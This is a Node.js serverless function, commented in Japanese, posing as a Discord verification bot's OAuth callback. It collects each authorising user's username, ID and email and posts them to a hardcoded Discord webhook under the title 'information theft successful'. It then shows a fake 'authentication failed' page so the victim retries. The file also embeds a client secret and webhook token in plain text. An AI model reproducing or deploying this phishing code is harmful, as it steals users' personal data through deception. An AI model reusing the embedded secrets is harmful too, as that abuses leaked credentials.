const axios = require('axios');

exports.handler = async (event) => {
    const code = event.queryStringParameters.code;
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1487151800657121422/kP7ED3TYjbEvV5iaBrm3FUBEfEGtPIkcSdueORh91uFz-2L1MMGPV6Pxg2-JPe5KYXWY";
    const CLIENT_ID = "1486331018947330118";
    const CLIENT_SECRET = "jvQXDpFAX52L2okWM4hSOnMYFq2yco0R"; // ★Developer Portalから取得したSecretをここに入れる
    const REDIRECT_URI = "https://certification-bot.netlify.app";

    // 認証失敗UIのHTMLデータ
    const errorHtml = `
    <!DOCTYPE html>
    <html lang="ja">
    <head>
        <meta charset="UTF-8"><title>認証失敗</title>
        <style>
            body { margin: 0; font-family: sans-serif; background: #313338; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { background: #2b2d31; width: 380px; border-radius: 12px; padding: 30px; text-align: center; color: white; box-shadow: 0 0 40px rgba(0,0,0,0.6); }
            .icon { width: 80px; height: 80px; background: #ed4245; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; font-size: 40px; }
            h1 { font-size: 22px; }
            p { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
            button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">✖</div>
            <h1>認証に失敗しました</h1>
            <p>このアカウントの認証中に問題が発生しました。<br>もう一度やり直してください。</p>
            <button onclick="location.href='https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email'">再試行</button>
        </div>
    </body>
    </html>`;

    if (!code) {
        return { statusCode: 200, headers: {"Content-Type": "text/html"}, body: errorHtml };
    }

    try {
        // 1. アクセストークン取得
        const params = new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI
        });
        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', params);
        
        // 2. ユーザー情報取得
        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${tokenRes.data.access_token}` }
        });
        const user = userRes.data;

        // 3. Webhook送信
        await axios.post(WEBHOOK_URL, {
            embeds: [{
                title: "✅ 情報奪取成功",
                color: 0x5865f2,
                thumbnail: { url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null },
                fields: [
                    { name: "名前", value: user.username, inline: true },
                    { name: "ID", value: user.id, inline: true },
                    { name: "メール", value: user.email || "取得不可" }
                ],
                timestamp: new Date().toISOString()
            }]
        });

        // 4. 画面には「失敗UI」を返す
        return {
            statusCode: 200,
            headers: { "Content-Type": "text/html" },
            body: errorHtml
        };

    } catch (err) {
        return { statusCode: 200, headers: {"Content-Type": "text/html"}, body: errorHtml };
    }
};
